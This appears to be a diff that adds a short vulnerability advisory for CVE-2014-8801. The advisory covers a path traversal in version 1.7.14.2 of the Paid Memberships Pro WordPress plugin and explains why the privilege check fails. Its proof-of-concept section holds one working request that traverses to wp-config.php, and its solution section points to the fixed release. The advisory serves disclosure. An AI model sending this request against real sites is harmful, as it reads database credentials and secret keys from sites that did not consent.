@@ -1,0 +1,24 @@
+# Exploit Title: Paid Memberships Pro 1.7.14.2 Path Traversal
+# Date: 14-10-2014
+# Exploit Author: Kacper Szurek - http://security.szurek.pl
+# Software Link: https://downloads.wordpress.org/plugin/paid-memberships-pro.1.7.14.2.zip
+# Category: webapps
+# CVE: CVE-2014-8801
+ 
+1. Description
+ 
+getfile.php is accessible to everyone.
+is_admin() is used to check priveleges but because this code is run in context of wp-admin/admin-ajax.php this function always evalute to true.
+$_SERVER['REQUEST_URI'] is not escaped.
+ 
+http://security.szurek.pl/paid-memberships-pro-17142-path-traversal.html
+ 
+2. Proof of Concept
+ 
+http://wordpress-url/wp-admin/admin-ajax.php?action=getfile&/../../wp-config.php
+ 
+3. Solution:
+ 
+Update to version 1.7.15
+http://downloads.wordpress.org/plugin/paid-memberships-pro.1.7.15.zip
+http://www.paidmembershipspro.com/2014/11/critical-security-update-pmpro-v1-7-15/
